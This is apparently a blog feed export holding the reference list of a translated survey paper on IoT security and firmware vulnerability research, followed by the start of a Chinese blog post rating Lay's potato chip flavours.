<p>[^5]: Gan, G.; Lu, Z.; Jiang, J. Internet of things security analysis. In Proceedings of the International Conference on Internet Technology and Applications, Wuhan, China, 16–18 August 2011.</p>
<p>[^6]: Suo, H.; Wan, J.; Zou, C.; Liu, J. Security in the internet of things: A review. In Proceeding of the International Conference on Computer Science and Electronics Engineering, Hangzhou, China, 23–25 March 2012.</p>
<p>[^7]: Zhao, K., Ge; L. A survey on the internet of things security. In Proceedings of the 2013 Ninth International Conference on Computational Intelligence and Security, Leshan, China, 14–15 December 2013.</p>
<p>[^8]: Pescatore, J.; Shpantzer, G. Securing the Internet of Things Survey; SANS Institute: Bethesda, MD, USA, 2014;pp. 1–22.</p>
<p>[^9]: Balte, A.; Kashid, A.; Patil, B. Security issues in Internet of things (IoT): A survey. Int. J. Adv. Res. Comput.Sci. Softw. Eng. 2018, 5, 450–455.</p>
<p>[^10]: Ngu, A.H.; Gutierrez, M.; Metsis, V.; Nepal, S.; Sheng, Q.Z. IoT middleware: A survey on issues and enabling technologies. IEEE Int. Things J. 2016, 4, 1–20. [CrossRef]</p>
<p>[^11]: Yang, Y.; Wu, L.; Yin, G.; Li, L.; Zhao, H. A survey on security and privacy issues in Internet-of-Things. IEEE Int. Things J. 2017, 4, 1250–1258. [CrossRef]</p>
<p>[^12]: Alaba, F.A.; Othman, M.; Hashem, I.A.T.; Alotaibi, F. Internet of Things security: A survey. J. Net. Comput.Appl. 2017, 88, 10–28. [CrossRef]</p>
<p>[^13]: Zhang, Z.K.; Cho, M.C.Y.; Wang, C.W.; Hsu, C.W.; Chen, C.K.; Shieh, S. IoT security: ongoing challenges and research opportunities. In Proceedings of the 7th IEEE International Conference on Service-Oriented Computing and Applications, Matsue, Japan, 17–19 November 2014.</p>
<p>[^14]: Mahmoud, R.; Yousuf, T.; Aloul, F.; Zualkernan, I. Internet of things (IoT) security: Current status, challenges and prospective measures. In Proceedings of the 10th International Conference for Internet Technology and Secured Transactions (ICITST), London, UK, 14–16 December 2015.</p>
<p>[^15]: Fernandes, E.; Rahmati, A.; Eykholt, K.; Prakash, A. Internet of things security research: A rehash of old ideas or new intellectual challenges. IEEE Secur. Priv. 2017, 15, 79–84. [CrossRef]</p>
<p>[^16]: Al-Garadi, M.A.; Mohamed, A.; Al-Ali, A.; Du, X.; Guizani, M. A survey of machine and deep learning methods for internet of things (IoT) security. arXiv 2018, arXiv:1807.11023. Available online: <span class="exturl" data-url="aHR0cHM6Ly9hcnhpdi5vcmcvYWJzLzE4MDcuMTEwMjM=">https://arxiv.org/abs/1807.11023<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^17]: Alrawi, O.; Lever, C.; Antonakakis, M.; Monrose, F. Sok: Security evaluation of home-based IoT deployments. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 19–23 May 2019.</p>
<p>[^18]: Xie, W.; Jiang, Y.; Tang, Y.; Ding, N.; Gao, Y. Vulnerability detection in IoT firmware: A survey. In Proceedings of the IEEE 23rd International Conference on Parallel and Distributed Systems (ICPADS), Shenzhen, China, 15–17 December 2017.</p>
<p>[^19]: Zheng, Y.; Wen, H.; Cheng, K.; Song, Z.W.; Zhu, H.S.; Sun, L.M. A Survey of IoT Device Vulnerability Mining Techniques. J. Cyber Secur. 2019, 4, 61–75. [CrossRef]</p>
<p>[^20]: Samsung. Samsung SmartThings. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc21hcnR0aGluZ3MuY29tLw==">https://www.smartthings.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^21]: Google. Google Weave Project. Available online: <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vd2VhdmUv">https://developers.google.com/weave/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^22]: Apple Inc. Apple HomeKit. Available online: <span class="exturl" data-url="aHR0cDovL3d3dy5hcHBsZS5jb20vaW9zL2hvbWUv">http://www.apple.com/ios/home/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^23]: Home, A. Home Assistant. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuaG9tZS1hc3Npc3RhbnQuaW8=">https://www.home-assistant.io<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^24]: Mi Inc. IoT Developer Platform. Available online: <span class="exturl" data-url="aHR0cHM6Ly9Jb1QubWkuY29tLw==">https://IoT.mi.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^25]: WiFi, A. WiFi. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cud2ktZmkub3JnLw==">https://www.wi-fi.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^26]: Zigbee, A. Zigbee. Available online: <span class="exturl" data-url="aHR0cHM6Ly96aWdiZWUub3JnLw==">https://zigbee.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^27]: Bluetooth Technology Website. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmx1ZXRvb3RoLmNvbS8=">https://www.bluetooth.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^28]: Liu, X.; Zhou, Z.; Diao, W.; Li, Z.; hang, K. When good becomes evil: Keystroke inference with smartwatch. In Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security, Denver, CO, USA, 12–16 October 2015.</p>
<p>[^29]: Das, A.; Borisov, N.; Caesar M. Do you hear what i hear?: Fingerprinting smart devices through embedded acoustic components. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Scottsdale, AZ, USA, 3–7 November 2014. Future Internet 2019, 12, 27 19 of 23</p>
<p>[^30]: Vasyltsov, I.; Lee, S. Entropy extraction from bio-signals in healthcare IoT. In Proceedings of the 1st ACM Workshop on IoT Privacy, Trust, and Security, Singapore, 14 April 2015.</p>
<p>[^31]: McCann, D.; Eder, K.; Oswald, E. Characterising and comparing the energy consumption of side channel attack countermeasures and lightweight cryptography on embedded device. In Proceedings of the International Workshop on Secure Internet of Things (SIoT), Vienna, Austria, 21–25 September 2015.</p>
<p>[^32]: Stokes, P., SentinelOne. Checkm8: 5 Things You Should Know about the New Ios Boot Rom Exploit. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VudGluZWxvbmUuY29tL2Jsb2cvY2hlY2ttOC01LXRoaW5ncy15b3Utc2hvdWxkLWtub3ctbmV3LWlvcy1ib290JUVGJUJGJUJFcm9tLWV4cGxvaXQv">https://www.sentinelone.com/blog/checkm8-5-things-you-should-know-new-ios-boot￾rom-exploit/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^33]: MITRE Corp. Marvell WiFi. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3Zla2V5LmNnaT9rZXl3b3JkPStNYXJ2ZWxsK1dpRmk=">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=+Marvell+WiFi<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^34]: Paganini, P. Million of Telestar Digital GmbH IoT Radio Devices Can Be Remotely Hacked. Available online:<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eWFmZmFpcnMuY28vd29yZHByZXNzLzkxMDY5L2hhY2tpbmcvdGVsZXN0YXItSW9ULXJhZGlvLWRldmljZXMtaGFjay5odG1s">https://securityaffairs.co/wordpress/91069/hacking/telestar-IoT-radio-devices-hack.html<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^35]: MITRE Corp. CVE-2019-13473. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxOS0xMzQ3Mw==">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13473<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^36]: MITRE Corp. CVE-2019-13474. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxOS0xMzQ3NA==">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13474<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^37]: Costa Gondim, J.J.; de Oliveira Albuquerque, R.; Clayton Alves Nascimento, A.; García Villalba, L.J.;Kim, T.H. A methodological approach for assessing amplified reflection distributed denial of service on the internet of things. Sensors 2016, 16, 1855. [CrossRef] [PubMed]</p>
<p>[^38]: Wikipedia. Constrained Application Protocol. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kv">https://en.wikipedia.org/wiki/<i class="fa fa-external-link-alt"></i></span> Constrained_Application_Protocol (accessed on 6 December 2019).</p>
<p>[^39]: UPnP Corp. UPnP Device Architecture 1.0. Available online: <span class="exturl" data-url="aHR0cDovL3d3dy51cG5wLm9yZy9zcGVjcy9hcmNoL1VQblAlRUYlQkYlQkVhcmNoLURldmljZUFyY2hpdGVjdHVyZS12MS4wLTIwMDgwNDI0LnBkZg==">http://www.upnp.org/specs/arch/UPnP￾arch-DeviceArchitecture-v1.0-20080424.pdf<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^40]: Li, C.; Cai, Q.; Li, J.; Liu, H.; Zhang, Y.; Gu, D.; Yu, Y. Passwords in the Air: Harvesting Wi-Fi Credentials from SmartCfg Provisioning. In Proceedings of the 11th ACM Conference on Security &amp; Privacy in Wireless and Mobile Networks, Stockholm, Sweden, 18–20 June 2018.</p>
<p>[^41]: Zhou, W.; Jia, Y.; Yao, Y.; Zhu, L.; Guan, L.; Mao, Y.; Zhang, Y. Phantom Device Attack: Uncovering the Security Implications of the Interactions among Devices, IoT Cloud, and Mobile Apps. arXiv 2018, arXiv:1811.03241.</p>
<p>[^42]: Vasile, S.; Oswald, D.; Chothia, T. Breaking All the Things—A Systematic Survey of Firmware Extraction Techniques for IoT Devices. In Proceedings of the International Conference on Smart Card Research and Advanced Applications, Montpellier, France, 12–14 November 2018.</p>
<p>[^43]: Zaddach, J.; Bruno, L.; Francillon, A.; Balzarotti, D. AVATAR: A Framework to Support Dynamic Security Analysis of Embedded Systems’ Firmwares. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 23–26 February 2014.</p>
<p>[^44]: Kammerstetter, M.; Platzer, C.; Kastner, W. Prospect: peripheral proxying supported embedded code <span class="exturl" data-url="aHR0cDovL3Rlc3RpbmcuSW4=">testing.In<i class="fa fa-external-link-alt"></i></span> Proceedings of the 9th ACM Symposium on Information, Computer and Communications Security, Kyoto, Japan, 3–6 June 2014.</p>
<p>[^45]: Koscher, K.; Kohno, T.; Molnar, D. SURROGATES: Enabling Near-Real-Time Dynamic Analyses of Embedded Systems. In Proceedings of the 9th USENIX Workshop on Offensive Technologies (WOOT 15), Washington, DC, USA, 10–11 August 2015.</p>
<p>[^46]: Muench, M.; Nisi, D.; Francillon, A.; Balzarotti, D. Avatar 2: A Multi-target Orchestration Platform. In Proceedings of the Workshop on Binary Analysis Research (colocated with NDSS Symposium), San Diego, CA, USA, 18 February 2018.</p>
<p>[^47]: Chen, D.D.; Woo, M.; Brumley, D.; Egele, M. Towards Automated Dynamic Analysis for Linux-based Embedded Firmware. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 21–24 February 2016.</p>
<p>[^48]: Bellard, F. QEMU, a fast and portable dynamic translator. In Proceedings of the USENIX Annual Technical Conference, Anaheim, CA, USA, 10–15 April 2005.</p>
<p>[^49]: Wikipedia. Fuzzing. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRnV6emluZw==">https://en.wikipedia.org/wiki/Fuzzing<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019). Future Internet 2019, 12, 27 20 of 23</p>
<p>[^50]: Wikipedia. Taint Checking. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVGFpbnRfY2hlY2tpbmc=">https://en.wikipedia.org/wiki/Taint_checking<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^51]: King, J.C. Symbolic execution and program testing. Commun. ACM 1976, 19; 385–394. [CrossRef]</p>
<p>[^52]: Alimi, V.; Vernois, S.; Rosenberger, C. Analysis of embedded applications by evolutionary <span class="exturl" data-url="aHR0cDovL2Z1enppbmcuSW4=">fuzzing.In<i class="fa fa-external-link-alt"></i></span> Proceedings the 2014 International Conference on High Performance Computing &amp; Simulation (HPCS), Bologna, Italy, 21–25 July 2014.</p>
<p>[^53]: Kamel, N.; Lanet, J.L. Analysis of HTTP protocol implementation in smart card embedded web server. Int. J. Inf. Netw. Security (IJINS) 2013, 2, 417. [CrossRef]</p>
<p>[^54]: Koscher, K.; Czeskis, A.; Roesner, F.; Patel, S.; Kohno, T.; Checkoway, S.; McCoy, D.; Kantor, B.; Anderson, D;Shacham, H.; et al. Experimental security analysis of a modern automobile. In Proceedings of the IEEE Symposium on Security and Privacy (SP), Berkeley, CA, USA, 16–19 May 2010.</p>
<p>[^55]: Lee, H.; Choi, K.; Chung, K.; Kim, J.; Yim, K. Fuzzing can packets into automobiles. In Proceedings of the 29th International Conference on Advanced Information Networking and Applications, Gwangiu, Korea,24–27 March 2015.</p>
<p>[^56]: Wikipedia. CAN bus. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ0FOX2J1cw==">https://en.wikipedia.org/wiki/CAN_bus<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^57]: Chen, J.; Diao, W.; Zhao, Q.; Zuo, C.; Lin, Z.; Wang, X.; Lau, W.C.; Sun, M.; Yang, R.; Zhang, K. IoTfuzzer:Discovering Memory Corruptions in IoT through App-Based Fuzzing. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 18–21 February 2018.</p>
<p>[^58]: Costin, A.; Zarras, A.; Francillon, A. Automated dynamic firmware analysis at scale: A case studyon embedded web interfaces. In Proceedings of the 11th ACM on Asia Conference on Computer and Communications Security, Xi’an, China, 30 May–3 June 2016.</p>
<p>[^59]: Srivastava, P.; Peng, H.; Li, J.; Okhravi, H.; Shrobe, H.; Payer, M. FirmFuzz: Automated IoT Firmware Introspection and Analysis. In Proceedings of the 2nd International ACM Workshop on Security and Privacy for the Internet-of-Things, London, UK, 15 November 2019.</p>
<p>[^60]: Zheng, Y.; Davanian, A.; Yin, H.; Song, C.; Zhu, H.; Sun, L. FIRM-AFL: high-throughput greybox fuzzing of IoT firmware via augmented process emulation. In Proceedings of the 28th USENIX Security Symposium (USENIX Security 19), Santa Clara, CA, USA, 14–16 August 2019.</p>
<p>[^61]: Zalewski, M. American Fuzzy Lop. Available online: <span class="exturl" data-url="aHR0cDovL2xjYW10dWYuY29yZWR1bXAuY3gvYWZs">http://lcamtuf.coredump.cx/afl<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^62]: Muench, M.; Stijohann, J.; Kargl, F.; Francillon, A.; Balzarotti, D. What You Corrupt Is Not What You Crash: Challenges in Fuzzing Embedded Devices. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 18–21 February 2018.</p>
<p>[^63]: Dolan-Gavitt, B.; Hodosh, J.; Hulin, P.; Leek, T.; Whelan, R. Repeatable reverse engineering with <span class="exturl" data-url="aHR0cDovL1BBTkRBLklu">PANDA.In<i class="fa fa-external-link-alt"></i></span> Proceedings of the 5th Program Protection and Reverse Engineering Workshop, Los Angeles, CA, USA,15 December 2015.</p>
<p>[^64]: Costin, A.; Zaddach, J.; Francillon, A.; Balzarotti, D. A large-scale analysis of the security of embedded firmwares. In Proceedings of the 23rd USENIX Security Symposium (USENIX Security 14), San Diego, CA, USA, 20–22 August 2014.</p>
<p>[^65]: Davidson, D.; Moench, B.; Ristenpart, T.; Jha, S. FIE on Firmware: Finding Vulnerabilities in Embedded Systems Using Symbolic Execution. In Proceedings of the 22nd USENIX Security Symposium (USENIX Security 13), Washington, DC, USA, 14–16 August 2013.</p>
<p>[^66]: Celik, Z.B.; Babun, L.; Sikder, A.K.; Aksu, H.; Tan, G.; McDaniel, P.; Uluagac, A.S. KLEE: Unassisted and Automatic Generation of High-Coverage Tests for Complex Systems Programs. In Proceedings of the 8th USENIX Symposium on Operating Systems Design and Implementation(OSDI 2008), San Diego, CA, USA, 8–10 December 2008.</p>
<p>[^67]: Shoshitaishvili, Y.; Wang, R.; Hauser, C.; Kruegel, C.; Vigna, G. Firmalice-Automatic Detection of Authentication Bypass Vulnerabilities in Binary Firmware. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 8–11 February 2015.</p>
<p>[^68]: Celik, Z.B.; Babun, L.; Sikder, A.K.; Aksu, H.; Tan, G.; McDaniel, P.; Uluagac, A.S. Sensitive information tracking in commodity IoT. In Proceedings of the 27th USENIX Security Symposium (USENIX Security 18), Baltimore, MD, USA, 15–17 August 2018. Future Internet 2019, 12, 27 21 of 23</p>
<p>[^69]: Cheng, K.; Li, Q.; Wang, L.; Chen, Q.; Zheng, Y.; Sun, L.; Liang, Z. DTaint: detecting the taint-style vulnerability in embedded device firmware. In Proceedings of the 48th Annual IEEE/IFIP International Conference on Dependable Systems and Networks (DSN), Luxembourg, 25–28 June 2018.</p>
<p>[^70]: Cui, A.; Stolfo, S.J. A quantitative analysis of the insecurity of embedded network devices: results of a wide-area scan. In Proceedings of the 26th Annual Computer Security Applications Conference, Austin, TX, USA, 6–10 December 2010.</p>
<p>[^71]: Al-Alami, H;, Ali, H.; Hussein, A.B. Vulnerability scanning of IoT devices in Jordan using Shodan. In Proceedings of the 2nd International Conference on the Applications of Information Technology in Developing Renewable Energy Processes &amp; Systems (IT-DREPS), Amman, Jordan, 6–7 December 2017.</p>
<p>[^72]: Durumeric, Z.; Adrian, D.; Mirian, A.; Bailey, M.; Halderman, J.A. A search engine backed by Internet-wide scanning. In Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security, Denver, CO, USA, 12–16 October 2015.</p>
<p>[^73]: Knownsec, Inc. Zoomeye. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv">https://www.zoomeye.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^74]: Li, Z.; Lu, S.; Myagmar, S.; Zhou, Y. CP-Miner: A Tool for Finding Copy-paste and Related Bugs in Operating System Code. In Proceedings of the 6th Symposium on Operating System Design and Implementation (OSDI 2004), San Francisco, CA, USA, 6–8 December 2004.</p>
<p>[^75]: Jang, J.; Agrawal, A.; Brumley, D. ReDeBug: finding unpatched code clones in entire os distributions. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 20–23 May 2012.</p>
<p>[^76]: Wikipedia. N-gram. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTi1ncmFt">https://en.wikipedia.org/wiki/N-gram<i class="fa fa-external-link-alt"></i></span> (accessed on 6December 2019).</p>
<p>[^77]: Myles, G.; Christian, C. K-gram based software birthmarks. In Proceedings of the 2005 ACM Symposium on Applied Computing, Santa Fe, NM, USA, 13–17 March 2005.</p>
<p>[^78]: Khoo, W.M.; Mycroft, A.; Anderson R. Rendezvous: A search engine for binary code. In Proceedings of the 10th Working Conference on Mining Software Repositories, San Francisco, CA, USA, 18–19 May 2013.</p>
<p>[^79]: Karim, M.E.; Walenstein, A.; Lakhotia, A.; Parida, L. Malware phylogeny generation using permutations of code. J. Comput. Virol. 2005, 1, 13–23. [CrossRef]</p>
<p>[^80]: David, Y.; Yahav, E. Tracelet-based code search in executables. Acm Sigplan Notices 2014, 49, 349–360.[CrossRef]</p>
<p>[^81]: Pewny, J.; Schuster, F.; Bernhard, L.; Holz, T.; Rossow, C. Leveraging semantic signatures for bug search in binary programs. In Proceedings of the 30th Annual Computer Security Applications Conference, New Orleans, LA, USA, 8–12 December 2014.</p>
<p>[^82]: Allen, F.E. Control flow analysis. ACM Sigplan Notices 1970, 55, 7. [CrossRef]</p>
<p>[^83]: Dullien, T.; Rolles, R. Graph-based comparison of executable objects. In Proceedings of the SSTIC’05, Rennes, France, 1–3 July 2005.</p>
<p>[^84]: Bourquin, M.; King, A.; Robbins, E. Binslayer: accurate comparison of binary executables. In Proceedings of the 2nd ACM SIGPLAN Program Protection and Reverse Engineering Workshop, Rome, Italy, 26 January 2013.</p>
<p>[^85]: Egele, M.; Woo, M.; Chapman, P.; Brumley, D. Blanket execution: Dynamic similarity testing for program binaries and components. In Proceedings of the 23rd USENIX Security Symposium (USENIX Security 14), San Diego, CA, USA, 20–22 August 2014.</p>
<p>[^86]: Gao, D.; Reiter, M.K.;Song, D. Binhunt: Automatically finding semantic differences in binary programs. In Proceedings of the International Conference on Information and Communications Security, Birmingham, UK, 20–22 October 2008.</p>
<p>[^87]: Ming, J.; Pan, M.; Gao, D. iBinHunt: Binary hunting with inter-procedural control flow. In Proceedings of the International Conference on Information Security and Cryptology, Seoul, Korea, 28–30 November 2012.</p>
<p>[^88]: Pewny, J.; Garmany, B.; Gawlik, R.; Rossow, C.; Holz, T. Cross-architecture bug search in binary executables. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Jose, CA, USA, 17–21 May 2015.</p>
<p>[^89]: Eschweiler, S.; Yakdan, K.; Gerhards-Padilla, E. discovRE: Efficient Cross-Architecture Identification of Bugs in Binary Code. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 21–24 February 2016.Future Internet 2019, 12, 27 22 of 23</p>
<p>[^90]: Chandramohan, M.; Xue, Y.; Xu, Z.; Liu, Y.; Cho, C.Y.; Tan, H.B.K. Bingo: Cross-architecture cross-os binary search. In Proceedings of the 24th ACM SIGSOFT International Symposium on Foundations of Software Engineering, Seattle, WA, USA, 13–18 November 2016.</p>
<p>[^91]: Feng, Q.; Zhou, R.; Xu, C.; Cheng, Y.; Testa, B.; Yin, H. Scalable graph-based bug search for firmware images. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Vienna, Austria, 24–28 October 2016.</p>
<p>[^92]: Yan, S.; Xu, D.; Zhang, B.; Zhang, H.J.; Yang, Q.; Lin, S. Graph embedding and extensions: A general framework for dimensionality reduction. IEEE Transact. Pattern Anal. Mach. Intell. 2007, 29, 40–51. [CrossRef]</p>
<p>[^93]: Xu, X.; Liu, C.; Feng, Q.; Yin, H.; Song, L.; Song, D. Neural network-based graph embedding for cross-platform binary code similarity detection. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Dallas, TX, USA, 30 October–3 November 2017.</p>
<p>[^94]: Liu, B.; Huo, W.; Zhang, C.; Li, W.; Li, F.; Piao, A.; Zou, W. αDiff: cross-version binary code similarity detection with DNN. In Proceedings of the 33rd ACM/IEEE International Conference on Automated Software Engineering, Montpellier, France, 3–7 September 2018.</p>
<p>[^95]: Gao, J.; Yang, X.; Fu, Y.; Jiang, Y.; Sun, J. Vulseeker: a semantic learning based vulnerability seeker for cross-platform binary. In Proceedings of the 33rd ACM/IEEE International Conference on Automated Software Engineering, Montpellier, France, 3–7 September 2018.</p>
<p>[^96]: Gao, J.; Yang, X.; Fu, Y.; Jiang, Y.; Shi, H.; Sun, J. Vulseeker-pro: enhanced semantic learning based binary vulnerability seeker with emulation. In Proceedings of the 26th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering, Tallinn, Estonia, 26–30 August 2019.</p>
<p>[^97]: Long, F.; Rinard, M. Prophet: Automatic Patch Generation via Learning from Successful Patches. <span class="exturl" data-url="aHR0cHM6Ly9jb3JlLmFjLnVrL2Rvd25sb2FkL3BkZi83ODA2Mjk0NS5wZGY=">https://core.ac.uk/download/pdf/78062945.pdf<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^98]: Long, F.; Rinard, M. Automatic patch generation by learning correct code. In Proceedings of the 43rd Annual ACM SIGPLAN-SIGACT Symposium on Principles of Programming Languages, St. Petersburg, FL, USA, 20–22 January 2016.</p>
<p>[^99]: Long, F.; Amidon, P.; Rinard, M. Automatic inference of code transforms for patch generation. In Proceedings of the 11th Joint Meeting on Foundations of Software Engineering, Paderborn, Germany, 4–8 September 2017.</p>
<p>[^100]: Le Goues, C.; Nguyen, T.; Forrest, S.; Weimer, W. Genprog: A generic method for automatic software repair. IEEE Trans. Soft. Eng. 2011, 38, 54–72. [CrossRef]</p>
<p>[^101]: Kim, D.; Nam, J.; Song, J.; Kim, S. Automatic patch generation learned from human-written patches. In Proceedings of the International Conference on Software Engineering, San Francisco, CA, USA, 18–26 May 2013.</p>
<p>[^102]: Zhang, Y.; Chen, Y.; Bao, C.; Xia, L.; Zhen, L.; Lu, Y.; Wei, T. Adaptive kernel live patching: An open collaborative effort to ameliorate android n-day root exploits. In Proceedings of Black Hat USA, Las Vegas, NA, USA, 30 July–4 August 2016.</p>
<p>[^103]: DARPA. Cyber Grand Challenge. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGFycGEubWlsL3Byb2dyYW0vY3liZXItZ3JhbmQlRUYlQkYlQkVjaGFsbGVuZ2U=">https://www.darpa.mil/program/cyber-grand￾challenge<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^104]: Shoshitaishvili, Y.; Bianchi, A.; Borgolte, K.; Cama, A.; Corbetta, J.; Disperati, F.; Dutcher, A.; Grosen, J.;Grosen, P.;Machiry, A.; etc. Mechanical phish: Resilient autonomous hacking. IEEE Secur. Priv. 2018, 16, 12–22. [CrossRef]</p>
<p>[^105]: Shoshitaishvili, Y.; Weissbacher, M.; Dresel, L.; Salls, C.; Wang, R.; Kruegel, C.; Vigna, G. Rise of the hacrs: Augmenting autonomous cyber reasoning systems with human assistance. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Dallas, TX, USA, 30 October–3 November 2017.</p>
<p>[^106]: Nguyen-Tuong, A.; Melski, D.; Davidson, J.W.; Co, M.; Hawkins, W.; Hiser, J.D.;Morris, D.; Nguyen, D.; Rizzi, E. Xandra: An Autonomous Cyber Battle System for the Cyber Grand Challenge. IEEE Secur. Priv.2018, 16, 42–51. [CrossRef]</p>
<p>[^107]: Fernandes, E.; Jung, J.; Prakash, A. Security analysis of emerging smart home applications. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Jose, CA, USA, 22–26 May 2016.</p>
<p>[^108]: Fernandes, E.; Paupore, J.; Rahmati, A.; Simionato, D.; Conti, M.; Prakash, A. Flowfence: Practical data protection for emerging IoT application frameworks. In Proceedings of the 25th USENIX Security Symposium (USENIX Security 16), Austin, TX, USA, 10–12 August 2016. Future Internet 2019, 12, 27 23 of 23</p>
<p>[^109]: Jia, Y.J.; Chen, Q.A.; Wang, S.; Rahmati, A.; Fernandes, E.; Mao, Z.M.; Prakash, A. ContexloT: Towards Providing Contextual Integrity to Appified IoT Platforms. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 26 February–1 March 2017.</p>
<p>[^110]: Rahmati, A.; Fernandes, E.; Eykholt, K.; Prakash, A. Tyche: A risk-based permission model for smart homes. In Proceedings of the IEEE Cybersecurity Development (SecDev), Cambridge, MA, USA, 30 September–2 October 2018.</p>
<p>[^111]: Tian, Y.; Zhang, N.; Lin, Y.H.; Wang, X.; Ur, B.; Guo, X.; Tague, P. Smartauth: User-centered authorization for the internet of things. In proceedings of the 26th USENIX Security Symposium (USENIX Security 17), Vancouver, BC, Canada, 16–18 August 2017.</p>
<p>[^112]: Lee, S.; Choi, J.; Kim, J.; Cho, B.; Lee, S.; Kim, H.; Kim, J. FACT: Functionality-centric access control system for IoT programming frameworks. In Proceedings of the 22nd ACM on Symposium on Access Control Models and Technologies, Indianapolis, IN, USA, 21–23 June 2017.</p>
<p>[^113]: Cui, A.; Costello, M.; Stolfo, S. When firmware modifications attack: A case study of embedded exploitation. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 24–27 February 2013.</p>
<p>[^114]: Goodfellow, I.; Pouget-Abadie, J.; Mirza, M.; Xu, B.; Warde-Farley, D.; Ozair, S.; Courville, A.; Bengio, Y. Generative adversarial nets. In Proceedings of the Advances in Neural Information Processing Systems 27 (NIPS 2014), Montreal, QC, Canada, 8–13 December 2014.</p>
<p>[^115]: Hiromoto, R.E.; Haney, M.; Vakanski, A. A secure architecture for IoT with supply chain risk management. In Proceedings of the 9th IEEE International Conference on Intelligent Data Acquisition and Advanced Computing Systems: Technology and Applications (IDAACS), Bucharest, Romania, 21–23 September 2017.</p>
]]></content>
      <tags>
        <tag>论文翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>乐事各种口味评价</title>
    <url>/4052.html</url>
    <content><![CDATA[<p>记录一下👴吃过的乐事袋装薯片的味道2333</p>
<p>完全不知道为啥会想着要记录这种东西…果然是属于莫名其妙的记录Orz</p>
<span id="more"></span>
<hr>
<p>春日限定-樱花米酿味：外观上表面有些红点（成分表的诱惑红），跟黄瓜味差不多甜，闻起来略微酒酿（醪糟）味，没啥特点，偏硬。属于再也不会吃的那种。（2/10）</p>
